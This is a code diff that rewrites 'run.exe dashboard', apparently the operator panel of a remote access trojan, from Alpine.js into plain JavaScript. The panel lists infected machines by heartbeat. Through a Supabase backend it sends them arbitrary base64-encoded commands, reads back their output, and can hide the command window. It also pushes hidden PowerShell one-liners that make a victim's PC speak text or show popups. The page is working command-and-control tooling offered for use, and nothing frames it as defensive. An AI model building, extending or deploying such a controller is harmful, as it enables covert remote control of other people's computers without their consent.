@@ -2,18 +2,12 @@
 <html>
 
 <head>
-    <title>Status</title>
-    <script src="https://unpkg.com/lucide@latest"></script>
-    <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
+    <title>run.exe dashboard</title>
     <style>
         * {
             padding: 0;
             margin: 0;
             box-sizing: border-box;
-        }
-
-        [x-cloak] {
-            display: none !important;
         }
 
         body {
@@ -58,7 +52,8 @@
             font-variant-numeric: tabular-nums;
         }
 
-        .context-menu {
+        #context-menu {
+            display: none;
             position: fixed;
             background-color: #222;
             border: 1px solid #555;
@@ -108,219 +103,272 @@
     </style>
 </head>
 
-<body x-data="app()" x-init="init()" @contextmenu.prevent @keydown.window.c="if(targetUser) fetchSingle(targetUser)"
-    @keydown.window.v="if(targetUser) viewOutput(targetUser)"
-    @keydown.window.s="if(targetUser) quickCommand('speak', $event)"
-    @keydown.window.a="if(targetUser) quickCommand('popup')">
+<body>
 
-    <!-- User List -->
-    <div x-show="!selected">
-        <template x-for="user in sortedRows" :key="user.username">
-            <div class="user-row">
-                <span class="status-dot" :style="{ color: getStatusColor(user) }">●</span>
+    <div id="user-list"></div>
 
-                <span class="username-interactive" x-text="user.username" @mouseenter="if(!showMenu) targetUser = user"
-                    @mouseleave="if(!showMenu) targetUser = null" @contextmenu.prevent="openMenu($event, user)">
-                </span>
-
-                <div class="spacer"></div>
-
-                <span class="timestamp-static" x-text="formatDate(user.updated_at)"></span>
-            </div>
-        </template>
-    </div>
-
-    <!-- Context Menu -->
-    <div x-cloak x-show="showMenu" class="context-menu" :style="`top: ${menuPos.y}px; left: ${menuPos.x}px;`"
-        x-transition @click.away="showMenu = false">
-
-        <div class="context-menu-item" @click="fetchSingle(targetUser); showMenu = false">
+    <div id="context-menu">
+        <div class="context-menu-item" id="menu-send-cmd">
             <span>Send Command</span>
             <div class="right">
-                <span class="eye-toggle" @click.stop="toggleVisibility(targetUser)" title="Toggle CMD visibility"
-                    :style="{ color: targetUser?.visible ? 'white' : 'gray' }">
-                    <template x-if="targetUser?.visible">
-                        <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none"
-                            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                            <path
-                                d="M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0" />
-                            <circle cx="12" cy="12" r="3" />
-                        </svg>
-                    </template>
-                    <template x-if="!targetUser?.visible">
-                        <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none"
-                            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                            <path
-                                d="M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49" />
-                            <path d="M14.084 14.158a3 3 0 0 1-4.242-4.242" />
-                            <path
-                                d="M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143" />
-                            <path d="m2 2 20 20" />
-                        </svg>
-                    </template>
+                <span class="eye-toggle" id="menu-eye-toggle" title="Toggle CMD visibility">
+                    <svg id="eye-icon-visible" xmlns="http://www.w3.org/2000/svg" width="12" height="12"
+                        viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path
+                            d="M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0" />
+                        <circle cx="12" cy="12" r="3" />
+                    </svg>
+                    <svg id="eye-icon-hidden" xmlns="http://www.w3.org/2000/svg" width="12" height="12"
+                        viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round" style="display:none;">
+                        <path
+                            d="M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49" />
+                        <path d="M14.084 14.158a3 3 0 0 1-4.242-4.242" />
+                        <path
+                            d="M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143" />
+                        <path d="m2 2 20 20" />
+                    </svg>
                 </span>
                 <span class="hint">C</span>
             </div>
         </div>
 
-        <div class="context-menu-item" @click="viewOutput(targetUser); showMenu = false">
+        <div class="context-menu-item" id="menu-view-output">
             <span>View Output (col)</span>
             <span class="hint">V</span>
         </div>
 
         <div class="divider"></div>
 
-        <div class="context-menu-item" @click="quickCommand('speak', $event)">
+        <div class="context-menu-item" id="menu-voice-chat">
             <span>Voice Chat</span>
             <span class="hint">S / ⇧S</span>
         </div>
 
-        <div class="context-menu-item" @click="quickCommand('popup')">
+        <div class="context-menu-item" id="menu-message-box">
             <span>Message Box</span>
             <span class="hint">A</span>
         </div>
     </div>
 
     <script>
-        lucide.createIcons();
+        const state = {
+            rows: [],
+            showMenu: false,
+            targetUser: null,
+            url: localStorage.getItem('supa_url'),
+            apiKey: localStorage.getItem('supa_key'),
+        };
 
-        function app() {
-            return {
-                rows: [],
-                selected: false,
-                showMenu: false,
-                menuPos: { x: 0, y: 0 },
-                targetUser: null,
-                url: localStorage.getItem('supa_url'),
-                apiKey: localStorage.getItem('supa_key'),
+        const $ = id => document.getElementById(id);
 
-                init() {
-                    if (!this.url || this.url === 'null' || !this.apiKey || this.apiKey === 'null') {
-                        const u = prompt('Enter Supabase URL:');
-                        const k = prompt('Enter Supabase API Key:');
-                        if (!u || !k) {
-                            alert('Both URL and API Key are required!');
-                            location.reload();
-                        }
-
-                        this.url = u;
-                        this.apiKey = k;
-                        localStorage.setItem('supa_url', u);
-                        localStorage.setItem('supa_key', k);
-                    }
-                    this.fetchData();
-                    setInterval(() => this.fetchData(), 4000);
-                },
-
-                get sortedRows() {
-                    const order = { green: 0, yellow: 1, red: 2 };
-                    return [...this.rows].sort((a, b) => {
-                        const diff = order[this.getStatusColor(a)] - order[this.getStatusColor(b)];
-                        return diff !== 0 ? diff : a.username.localeCompare(b.username);
-                    });
-                },
-
-                formatDate(isoString) {
-                    const d = new Date(isoString);
-                    const p = (n) => n.toString().padStart(2, '0');
-                    return `${p(d.getMonth() + 1)}/${p(d.getDate())}/${d.getFullYear()} ${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())}`;
-                },
-
-                getStatusColor(user) {
-                    const diff = (new Date().getTime() - new Date(user.updated_at).getTime()) / 1000;
-                    if (diff < 10) return 'green';
-                    if (diff < 60) return 'yellow';
-                    return 'red';
-                },
-
-                openMenu(e, user) {
-                    this.targetUser = user;
-                    this.menuPos = { x: e.clientX, y: e.clientY };
-                    this.showMenu = true;
-                },
-
-                async fetchData() {
-                    try {
-                        const res = await fetch(`${this.url}?select=username,updated_at,visible`, {
-                            headers: { apikey: this.apiKey, Authorization: `Bearer ${this.apiKey}` }
-                        });
-
-                        this.rows = await res.json();
-                    } catch (err) { console.error(err); }
-                },
-
-                async toggleVisibility(user) {
-                    const newState = !user.visible;
-                    user.visible = newState;
-                    try {
-                        await fetch(`${this.url}?username=eq.${user.username}`, {
-                            method: 'PATCH',
-                            headers: {
-                                apikey: this.apiKey,
-                                Authorization: `Bearer ${this.apiKey}`,
-                                'Content-Type': 'application/json'
-                            },
-                            body: JSON.stringify({ visible: newState })
-                        });
-                    } catch (err) {
-                        console.error(err);
-                        user.visible = !newState;
-                    }
-                },
-
-                fetchSingle(user) {
-                    this.showMenu = false;
-                    if (this.getStatusColor(user) !== 'green') return;
-
-                    const cmd = prompt(`Command for ${user.username}:`);
-                    if (cmd) this.sendCommand(user.username, btoa(cmd));
-                },
-
-                async viewOutput(user) {
-                    this.showMenu = false;
-                    try {
-                        const res = await fetch(`${this.url}?select=out&username=eq.${user.username}`, {
-                            headers: { apikey: this.apiKey, Authorization: `Bearer ${this.apiKey}` }
-                        });
-
-                        const data = await res.json();
-                        if (data[0]?.out) {
-                            const decoded = atob(data[0].out);
-                            await navigator.clipboard.writeText(decoded);
-                            alert(decoded);
-                        }
-                    } catch (err) { console.error(err); }
-                },
-
-                quickCommand(type, e = null) {
-                    const user = this.targetUser;
-                    this.showMenu = false;
-                    if (this.getStatusColor(user) !== 'green') return;
-
-                    const voiceType = (e && e.shiftKey) ? 'Zira' : 'David';
-                    let msg = prompt(`Enter message to ${type === 'speak' ? `speak with ${voiceType} voice` : 'display as a popup'} for ${user.username}:`);
-                    if (!msg) return;
-
-                    msg = msg.replace(/'/g, "''");
-                    const rawCmd = type === 'speak'
-                        ? `powershell -W H -C "$s=New-Object -Com SAPI.SpVoice;$s.Voice=$s.GetVoices()|Where-Object{$_.GetDescription() -like '*${voiceType}*'};$s.Speak('${msg}')"`
-                        : `powershell -W H -C "(New-Object -Com WScript.Shell).Popup('${msg}')"`;
-                    this.sendCommand(user.username, btoa(rawCmd));
-                },
-
-                async sendCommand(username, b64Cmd) {
-                    await fetch(`${this.url}?username=eq.${username}`, {
-                        method: 'PATCH',
-                        headers: {
-                            apikey: this.apiKey,
-                            Authorization: `Bearer ${this.apiKey}`,
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({ cmd: b64Cmd, run: true })
-                    });
+        function init() {
+            if (!state.url || state.url === 'null' || !state.apiKey || state.apiKey === 'null') {
+                const u = prompt('Enter Supabase URL:');
+                const k = prompt('Enter Supabase API Key:');
+                if (!u || !k) {
+                    alert('Both URL and API Key are required!');
+                    location.reload();
+                    return;
                 }
+                state.url = u;
+                state.apiKey = k;
+                localStorage.setItem('supa_url', u);
+                localStorage.setItem('supa_key', k);
+            }
+            fetchData();
+            setInterval(fetchData, 4000);
+            setupMenu();
+            setupKeyboard();
+        }
+
+        function formatDate(isoString) {
+            if (!isoString) return "--/--/---- --:--:--";
+            return new Date(isoString).toLocaleString();
+        }
+
+        function getStatusColor(user) {
+            const diff = (Date.now() - new Date(user.updated_at).getTime()) / 1000;
+            if (diff < 10) return 'green';
+            if (diff < 60) return 'yellow';
+            return 'red';
+        }
+
+        function sortedRows() {
+            const order = { green: 0, yellow: 1, red: 2 };
+            return [...state.rows].sort((a, b) => {
+                const diff = order[getStatusColor(a)] - order[getStatusColor(b)];
+                return diff !== 0 ? diff : a.username.localeCompare(b.username);
+            });
+        }
+
+        function renderList() {
+            const list = $('user-list');
+            list.innerHTML = '';
+            for (const user of sortedRows()) {
+                const row = document.createElement('div');
+                row.className = 'user-row';
+
+                const dot = document.createElement('span');
+                dot.className = 'status-dot';
+                dot.style.color = getStatusColor(user);
+                dot.textContent = '●';
+
+                const name = document.createElement('span');
+                name.className = 'username-interactive';
+                name.textContent = user.username;
+                name.addEventListener('mouseenter', () => { if (!state.showMenu) state.targetUser = user; });
+                name.addEventListener('mouseleave', () => { if (!state.showMenu) state.targetUser = null; });
+                name.addEventListener('contextmenu', e => { e.preventDefault(); openMenu(e, user); });
+
+                const spacer = document.createElement('div');
+                spacer.className = 'spacer';
+
+                const ts = document.createElement('span');
+                ts.className = 'timestamp-static';
+                ts.textContent = formatDate(user.updated_at);
+
+                row.appendChild(dot);
+                row.appendChild(name);
+                row.appendChild(spacer);
+                row.appendChild(ts);
+                list.appendChild(row);
             }
         }
+
+        function openMenu(e, user) {
+            state.targetUser = user;
+            state.showMenu = true;
+
+            const menu = $('context-menu');
+            menu.style.display = 'block';
+            menu.style.top = e.clientY + 'px';
+            menu.style.left = e.clientX + 'px';
+
+            updateEyeIcon(user);
+        }
+
+        function closeMenu() {
+            state.showMenu = false;
+            $('context-menu').style.display = 'none';
+        }
+
+        function updateEyeIcon(user) {
+            const eyeToggle = $('menu-eye-toggle');
+            eyeToggle.style.color = user?.visible ? 'white' : 'gray';
+            $('eye-icon-visible').style.display = user?.visible ? 'inline' : 'none';
+            $('eye-icon-hidden').style.display = user?.visible ? 'none' : 'inline';
+        }
+
+        function setupMenu() {
+            document.addEventListener('contextmenu', e => e.preventDefault());
+            document.addEventListener('click', e => {
+                if (!$('context-menu').contains(e.target)) closeMenu();
+            });
+
+            $('menu-send-cmd').addEventListener('click', () => { fetchSingle(state.targetUser); closeMenu(); });
+            $('menu-view-output').addEventListener('click', () => { viewOutput(state.targetUser); closeMenu(); });
+            $('menu-voice-chat').addEventListener('click', () => quickCommand('speak'));
+            $('menu-message-box').addEventListener('click', () => quickCommand('popup'));
+            $('menu-eye-toggle').addEventListener('click', e => {
+                e.stopPropagation();
+                toggleVisibility(state.targetUser);
+            });
+        }
+
+        function setupKeyboard() {
+            document.addEventListener('keydown', e => {
+                if (!state.targetUser) return;
+                if (e.key === 'c' || e.key === 'C') fetchSingle(state.targetUser);
+                if (e.key === 'v' || e.key === 'V') viewOutput(state.targetUser);
+                if (e.key === 's' || e.key === 'S') quickCommand('speak', e);
+                if (e.key === 'a' || e.key === 'A') quickCommand('popup');
+            });
+        }
+
+        async function fetchData() {
+            try {
+                const res = await fetch(`${state.url}?select=username,updated_at,visible`, {
+                    headers: { apikey: state.apiKey, Authorization: `Bearer ${state.apiKey}` }
+                });
+                state.rows = await res.json();
+                renderList();
+            } catch (err) { console.error(err); }
+        }
+
+        async function toggleVisibility(user) {
+            const newState = !user.visible;
+            user.visible = newState;
+            updateEyeIcon(user);
+            try {
+                await fetch(`${state.url}?username=eq.${user.username}`, {
+                    method: 'PATCH',
+                    headers: {
+                        apikey: state.apiKey,
+                        Authorization: `Bearer ${state.apiKey}`,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ visible: newState })
+                });
+            } catch (err) {
+                console.error(err);
+                user.visible = !newState;
+                updateEyeIcon(user);
+            }
+        }
+
+        function fetchSingle(user) {
+            closeMenu();
+            if (getStatusColor(user) !== 'green') return;
+            const cmd = prompt(`Send command to ${user.username}:`);
+            if (cmd) sendCommand(user.username, btoa(cmd));
+        }
+
+        async function viewOutput(user) {
+            closeMenu();
+            try {
+                const res = await fetch(`${state.url}?select=out&username=eq.${user.username}`, {
+                    headers: { apikey: state.apiKey, Authorization: `Bearer ${state.apiKey}` }
+                });
+                const data = await res.json();
+                if (data[0]?.out) {
+                    const decoded = atob(data[0].out);
+                    await navigator.clipboard.writeText(decoded);
+                    alert(decoded);
+                }
+            } catch (err) { console.error(err); }
+        }
+
+        function quickCommand(type, e = null) {
+            const user = state.targetUser;
+            closeMenu();
+            if (getStatusColor(user) !== 'green') return;
+
+            const voiceType = (e && e.shiftKey) ? 'Zira' : 'David';
+            let msg = prompt(`Enter message to ${type === 'speak' ? `speak with ${voiceType} voice` : 'display as a popup'} for ${user.username}:`);
+            if (!msg) return;
+
+            msg = msg.replace(/'/g, "''");
+            const rawCmd = type === 'speak'
+                ? `powershell -W H -C "$s=New-Object -Com SAPI.SpVoice;$s.Voice=$s.GetVoices()|Where-Object{$_.GetDescription() -like '*${voiceType}*'};$s.Speak('${msg}')"`
+                : `powershell -W H -C "(New-Object -Com WScript.Shell).Popup('${msg}')"`;
+            sendCommand(user.username, btoa(rawCmd));
+        }
+
+        async function sendCommand(username, b64Cmd) {
+            await fetch(`${state.url}?username=eq.${username}`, {
+                method: 'PATCH',
+                headers: {
+                    apikey: state.apiKey,
+                    Authorization: `Bearer ${state.apiKey}`,
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ cmd: b64Cmd, run: true })
+            });
+        }
+
+        init();
     </script>
 </body>
 
